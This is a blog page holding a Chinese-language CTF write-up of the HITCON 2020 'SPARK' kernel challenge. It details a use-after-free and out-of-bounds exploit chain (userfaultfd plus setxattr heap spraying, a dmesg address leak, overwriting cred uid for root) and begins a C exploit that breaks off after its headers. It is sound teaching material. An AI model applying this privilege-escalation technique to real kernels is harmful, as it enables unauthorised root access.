

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=auto>



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
  <link rel="icon" href="/img/favicon.png">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="author" content="Yogdzewa">
  <meta name="keywords" content="">
  
    <meta name="description" content="让我逝逝这些CTF">
<meta property="og:type" content="article">
<meta property="og:title" content="近期题目wp">
<meta property="og:url" content="https://yogdzewa.github.io/2022-09/Now-recent-ctf/index.html">
<meta property="og:site_name" content="Yogdzewa">
<meta property="og:description" content="让我逝逝这些CTF">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://yogdzewa.github.io/image/recent_ctf/image-20221026212243834.png">
<meta property="og:image" content="https://yogdzewa.github.io/image/recent_ctf/swim-lanes-chart-1.9fb3000aad85.png">
<meta property="og:image" content="https://itanium-cxx-abi.github.io/cxx-abi/warning.gif">
<meta property="og:image" content="https://itanium-cxx-abi.github.io/cxx-abi/warning.gif">
<meta property="og:image" content="https://itanium-cxx-abi.github.io/cxx-abi/warning.gif">
<meta property="og:image" content="https://yogdzewa.github.io/image/recent_ctf/image-20230101151729612.png">
<meta property="og:image" content="https://yogdzewa.github.io/image/recent_ctf/image-20230101233406596.png">
<meta property="og:image" content="https://yogdzewa.github.io/image/recent_ctf/image-20230102183226852.png">
<meta property="og:image" content="https://yogdzewa.github.io/image/recent_ctf/range-rbegin-rend.svg">
<meta property="og:image" content="https://yogdzewa.github.io/image/recent_ctf/image-20230124221604604.png">
<meta property="og:image" content="https://yogdzewa.github.io/image/recent_ctf/image-20230125112558204.png">
<meta property="og:image" content="https://yogdzewa.github.io/image/recent_ctf/image-20230129185730706.png">
<meta property="og:image" content="https://s2.loli.net/2023/02/16/LJGcbS9DlR5IadH.jpg">
<meta property="article:published_time" content="2022-09-08T02:00:00.000Z">
<meta property="article:modified_time" content="2023-07-24T02:55:49.497Z">
<meta property="article:author" content="Yogdzewa">
<meta property="article:tag" content="CTF">
<meta property="article:tag" content="PWN">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://yogdzewa.github.io/image/recent_ctf/image-20221026212243834.png">
  
  
  <title>近期题目wp - Yogdzewa</title>

  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css" />


  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4/github-markdown.min.css" />
  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hint.css@2/hint.min.css" />

  
    
    
      
      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10/styles/obsidian.min.css" />
    
  

  
    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3/dist/jquery.fancybox.min.css" />
  


<!-- 主题依赖的图标库，不要自行修改 -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">


<link  rel="stylesheet" href="/css/main.css" />

<!-- 自定义样式保持在最底部 -->


  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    var CONFIG = {"hostname":"yogdzewa.github.io","root":"/","version":"1.8.13","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":"§"},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
<meta name="generator" content="Hexo 5.4.0"></head>


<body>
  <header style="height: 70vh;">
    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>(￣.￣)</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/">
                <i class="iconfont icon-home-fill"></i>
                首页
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/">
                <i class="iconfont icon-archive-fill"></i>
                归档
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/">
                <i class="iconfont icon-category-fill"></i>
                分类
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/">
                <i class="iconfont icon-tags-fill"></i>
                标签
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/">
                <i class="iconfont icon-user-fill"></i>
                关于
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/links/">
                <i class="iconfont icon-link-fill"></i>
                友链
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
            </a>
          </li>
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

    <div class="banner" id="banner" parallax=true
         style="background: url('/image/edit2.jpg') no-repeat center center;
           background-size: cover;">
      <div class="full-bg-img">
        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
          <div class="page-header text-center fade-in-up">
            <span class="h2" id="subtitle" title="近期题目wp">
              
            </span>

            
              <div class="mt-3">
  
  
    <span class="post-meta">
      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
      <time datetime="2022-09-08 10:00" pubdate>
        2022年9月8日 上午
      </time>
    </span>
  
</div>

<div class="mt-1">
  
    <span class="post-meta mr-2">
      <i class="iconfont icon-chart"></i>
      160k 字
    </span>
  

  
    <span class="post-meta mr-2">
      <i class="iconfont icon-clock-fill"></i>
      
      
      2004 分钟
    </span>
  

  
  
    
      <!-- 不蒜子统计文章PV -->
      <span id="busuanzi_container_page_pv" style="display: none">
        <i class="iconfont icon-eye" aria-hidden="true"></i>
        <span id="busuanzi_value_page_pv"></span> 次
      </span>
    
  
</div>

            
          </div>

          
        </div>
      </div>
    </div>
  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="d-none d-lg-block col-lg-2"></div>
    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div class="py-5" id="board">
          <article class="post-content mx-auto">
            <!-- SEO header -->
            <h1 style="display: none">近期题目wp</h1>
            
              <p class="note note-info">
                
                  不可视境界线最后变动于：2023年7月24日 上午
                
              </p>
            
            <div class="markdown-body">
              <h2 id="SPARK"><a href="#SPARK" class="headerlink" title="SPARK"></a>SPARK</h2><blockquote>
<p>HITCON CTF 2020</p>
</blockquote>
<ul>
<li>代码里面看到<code>_InterlockedExchangeAdd()</code>函数, 其实是IDA中对lock指令前缀的函数替换. </li>
</ul>
<blockquote>
<p>汇编为<code>lock xadd cs:cur_count, eax</code> </p>
<p>The LOCK prefix can be prepended only to the following instructions and only to those forms of the instructions<br>where the destination operand is a memory operand: ADD, ADC, AND, BTC, BTR, BTS, CMPXCHG, CMPXCH8B,<br>CMPXCHG16B, DEC, INC, NEG, NOT, OR, SBB, SUB, XOR, <strong>XADD</strong>, and XCHG.</p>
<p>xadd是Exchange and Add. </p>
</blockquote>
<ul>
<li>还有mutex的结构体…. 大小为32个字节. 包含了啥我就不看了.<br>没想到还是要注意一下, 后面用到了mutex中的owner成员, 当锁被使用时可以读取当前进程的current结构体地址, 从而发现cred结构体地址. </li>
<li><code>__fentry__</code>到底是个<a target="_blank" rel="noopener" href="https://www.brendangregg.com/blog/2019-10-15/kernelrecipes-kernel-ftrace-internals.html">啥</a> | <a target="_blank" rel="noopener" href="https://www.eet-china.com/mp/a41923.html">中文文章</a> </li>
<li><code>char (*names)[3]</code> pointer to an array of 3 chars. </li>
</ul>
<p>好吧看不懂, linux/spark.h又是什么东西. </p>
<p>艰难的继续看代码, spark.h应该是没给的… </p>
<ul>
<li>**fget()**函数的功能是通过文件描述符查找并返回file结构体<br>而node结构体应该在struct file中offset为200的位置. 但是我不知道file中哪个成员能存储这种信息. </li>
</ul>
<h3 id="来自mhackeroni队的wp启发"><a href="#来自mhackeroni队的wp启发" class="headerlink" title="来自mhackeroni队的wp启发:"></a>来自<a target="_blank" rel="noopener" href="https://mhackeroni.it/archive/2020/12/05/hitcon2020-all-writeups.html#spark">mhackeroni</a>队的wp启发:</h3><p>ioctl功能:</p>
<ul>
<li>Link (<code>0x4008d900</code>): takes two node descriptors A and B, and a edge weight, and creates the edges A-&gt;B and B-&gt;A;</li>
<li>Info (<code>0x8018d901</code>): provides information about the node;</li>
<li>Finalize (<code>0xd902</code>): finalizes the graph rooted in the node, preparing it for queries;</li>
<li>Query (<code>0xc010d903</code>): takes two node descriptors and calculates the total weight of the shortest path between them.</li>
</ul>
<p>在release中: 如果refcount==1(正常情况), 释放traversal中nodes(如果有), 释放edge链表节点, 释放node. </p>
<p>其中的一些细节: </p>
<ul>
<li>open时每个节点的refcount默认为1, 当finalize的时候只有root节点进入<code>traversal()</code>函数时(第一次进入)不增加refcount, 这就意味着除了root, 其他的节点的refcount都会变成2. 而当release root的时候只有root.refcount小于2, 于是只有root的edge+traversal+node本身都被<code>kfree()</code>. <strong>看似正常, 实际上?</strong> </li>
<li>Info中有一个node-&gt;traversal-&gt;size的访问链, 而size在traversal中offset为0的位置. 意味着如果能够控制traversal字段那就可以实现任意读. <strong>如何控制traversal?</strong> </li>
<li>finalize中调用函数traversal进行DFS, 对node的refcount进行+1, 然而在link和query中没有refcount的判断和使用, 而且在release中如果大于等于二则直接退出, 不会调用kfree回收空间. <strong>能否修改refcount?</strong> </li>
<li>link后相邻节点保存在edge中, 然而当另一端的节点free/release后, edge中的node就构成了一个dangling ptr. 可以用来UAF. <strong>如何控制freed chunk?(uffd+setxattr)</strong> </li>
<li>query中malloc了一个dis_arr, 使用node及其children的traversal_idx来索引. <strong>能否越界?(看到个数组都要想能不能越界…)</strong> </li>
<li>具体为uffd+setxattr控制free后的chunk, 再伪造一个(finalize==1 &amp;&amp; traversal_idx&gt;16)的node, 制造出一个OOB(还真能越界). <strong>这个OOB能够修改什么东西?</strong> </li>
</ul>
<p>一般的内核题目都是提权, 直接变成root用户就可以读取/flag文件, 方法大致有任意写原语或者commit+prepare_cred. </p>
<p>可能的思路整理:</p>
<ul>
<li>还原ko文件类型信息. 看看demo.c中的示例便于理解. </li>
<li>还原成功, 发现可能是kmalloc和kfree为主的内核堆利用. 先制造出一个任意读. </li>
<li>getinfo中发现可能的任意读(只要控制了traversal), 这样只要在fd存在的时候node结构体同时也被我们控制就可以做到; 发现mutex的使用, 其中的owner成员可以直通cred; 发现UAF; 发现refcount的问题. </li>
<li>发现traversal_idx是属于node的属性, 而不是某次traversal的. 当query的时候还用到了node的children, 也就是默认了所有的child都属于同一次traversal. </li>
<li>综上所述, 结合<a target="_blank" rel="noopener" href="https://duasynt.com/blog/linux-kernel-heap-spray">uffd+setxattr</a>的方法, 可以在link完一个网再release一个fd之后, 立刻使用这种方法来修改node的内容. 这算是一个基础步骤. 如何继续利用?</li>
<li>把node-&gt;traversal_idx修改超过dis_arr的边界, 在query的时候越界修改tmp_node的refcount, 这样在release root之后只有tmp_node+root的会被释放, 而tmp_node的fd反而不会被影响. 只要在这之后马上malloc就可以<strong>实现任意读</strong>了. <ul>
<li>还有个小问题是如何让dis_arr放到node的前面? exp给出了方法: 前后malloc一些node, 中间两百个node中每隔几个释放一个node, 而dis_arr的大小由traversal时遍历到的node数量决定, 设置链接的node数量为16或17(为什么呢?想想吧)时就会刚好占据了原先node的间隙, 满足了越界的位置需求. </li>
<li>然后<strong>读啥呢</strong>? </li>
</ul>
</li>
<li>可以读取<code>node.lock.owner</code>进而定位到<code>cred</code>, 而因为get_info的v3-&gt;size时候<code>mutex_lock(a1-&gt;state_lock);</code>已经锁上, 所以可以直接读取. </li>
<li>下一个问题在于node结构体在哪里? 所以要在读取owner之前扫描内存寻找我们设置的特殊值, 有了个任意读的能力确实也可以做到. <strong>扫哪里呢</strong>?</li>
<li>主要问题就在于现在一个内核地址都没有, <u>特别是用来kmalloc的那一块区域</u>. 但是! dmesg是可用的, 可以利用OOB制造一个crash, 然后读取寄存器信息进而获取相应地址. 这可以通过libc库实现, 具体见源码中的<strong>第一阶段</strong>.<br>另外发现这个crash会导致内核出错+进程暂停, 但是如果在一个fork出的child中直接让他exit就没有问题了. </li>
<li>到现在一二阶段和三阶段初始都已完成. 接下来的任务是如何<strong>制造任意写将cred中uid改成0(root)?</strong> </li>
<li>想到OOB, 理论上可以覆盖一个地址为与首个子节点的连接权值, 但要覆盖cred.uid的话还要知道dis_arr的地址. 又想到一阶段malloc了一个dis_arr且由于crash并没有释放, 如果此时通过release(fd)释放traversal再马上query, 既知道了地址(一阶段时)又得到了一个可用的dis_arr. </li>
<li>接下来就是构造一下所需的结构. 需要额外的一个root加上一些其他节点, 加上fd构成一张网, 把和fd的连接权值赋为0(并且is_finalized!=1)作为要写入的内容. 至于释放和造网两者的顺序想来是没有区别的. <ul>
<li>又一个细节是所用到的root和其他节点都是在第一阶段之前分配的. 或许是为了防止混乱. </li>
</ul>
</li>
<li>最后就是修改traversal_idx, 进行一个root的query, 然后就完成了cred.uid的覆盖. 最后的最后直接print /flag. </li>
</ul>
<p>这是36小时能做完的题目吗??</p>
<h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> _GNU_SOURCE</span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;assert.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/ioctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;pthread.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;syscall.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;linux/userfaultfd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;poll.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/xattr.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;errno.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;signal.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/klog.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdbool.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;semaphore.h&gt;</span> <span class="hljs-comment">//used to set uffd interface</span></span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> DEV_PATH <span class="hljs-meta-string">&quot;/dev/node&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SPARK_FINALIZE 0xd902</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SPARK_LINK 0x4008d900</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SPARK_QUERY 0xc010d903</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SPARK_INFO 0x8018D901</span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">spark_ioctl_query</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-keyword">int</span> fd1;<br>    <span class="hljs-keyword">int</span> fd2;<br>    <span class="hljs-keyword">long</span> <span 